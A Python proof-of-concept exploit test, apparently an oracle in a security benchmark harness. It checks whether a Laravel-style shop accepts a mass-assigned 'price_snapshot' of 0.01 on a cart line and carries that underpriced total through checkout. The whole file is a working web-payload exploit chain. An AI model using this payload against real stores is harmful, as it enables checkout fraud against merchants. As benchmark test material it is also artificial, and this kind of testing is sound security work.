"""PoC exploit for the Laravel cart price snapshot override chain."""

from mosaic.oracle.exploit import ExploitTest


class LaravelCartPriceSnapshotExploit(ExploitTest):
    """Mass assignment on cart line price_snapshot allows underpriced checkout."""

    @property
    def chain_id(self) -> str:
        return "laravel_cart_price_snapshot_override"

    def setup(self) -> None:
        reset = self.http_post("/admin/reset")
        if not reset.ok:
            raise RuntimeError(
                f"Could not reset app state before exploit: "
                f"{reset.status_code} {reset.text[:200]}"
            )

    def execute(self) -> tuple[bool, str]:
        item_response = self.http_get("/shop/items/SKU-001")
        if item_response.status_code == 404:
            return False, "GET /shop/items/SKU-001 returned 404."
        if not item_response.ok:
            return False, f"GET /shop/items/SKU-001 failed: {item_response.status_code}"

        try:
            original_price = float(item_response.json()["item"]["price"])
        except Exception:
            return False, f"Could not read catalog price: {item_response.text[:200]}"

        payload = {
            "sku": "SKU-001",
            "quantity": 1,
            "price_snapshot": 0.01,
            "line_note": "rush order",
            "fulfillment_tag": "vip",
        }
        add_response = self.http_post("/shop/cart", json=payload)
        if add_response.status_code == 404:
            return False, "POST /shop/cart returned 404."
        if add_response.status_code == 422:
            return False, (
                "POST /shop/cart rejected the manipulated payload with 422, "
                "so the price snapshot override is not accepted."
            )
        if not add_response.ok:
            return False, f"POST /shop/cart failed: {add_response.status_code} {add_response.text[:200]}"

        cart_response = self.http_get("/shop/cart")
        if not cart_response.ok:
            return False, f"GET /shop/cart failed: {cart_response.status_code} {cart_response.text[:200]}"

        try:
            cart = cart_response.json()["cart"]
        except Exception:
            return False, f"Could not parse cart JSON: {cart_response.text[:200]}"

        items = cart.get("items") or []
        target = next((entry for entry in items if entry.get("sku") == "SKU-001"), None)
        if not isinstance(target, dict):
            return False, f"SKU-001 not found in cart payload: {items}"

        unit_price = target.get("unit_price")
        snapshot = target.get("price_snapshot")
        total = cart.get("total")

        checkout_response = self.http_post("/shop/checkout")
        if not checkout_response.ok:
            return False, (
                f"POST /shop/checkout failed after cart mutation: "
                f"{checkout_response.status_code} {checkout_response.text[:200]}"
            )

        try:
            order = checkout_response.json()["order"]
        except Exception:
            return False, f"Could not parse checkout JSON: {checkout_response.text[:200]}"

        order_total = order.get("total")
        if unit_price == 0.01 and snapshot == 0.01 and total == 0.01 and order_total == 0.01:
            return True, (
                "Cart price snapshot override persisted through checkout. "
                f"Catalog price was {original_price}, but POST /shop/cart accepted "
                "price_snapshot=0.01 and the cart/order total dropped to 0.01."
            )

        return False, (
            "Price snapshot override did not take effect. "
            f"Catalog price={original_price}, unit_price={unit_price}, "
            f"price_snapshot={snapshot}, cart_total={total}, order_total={order_total}."
        )
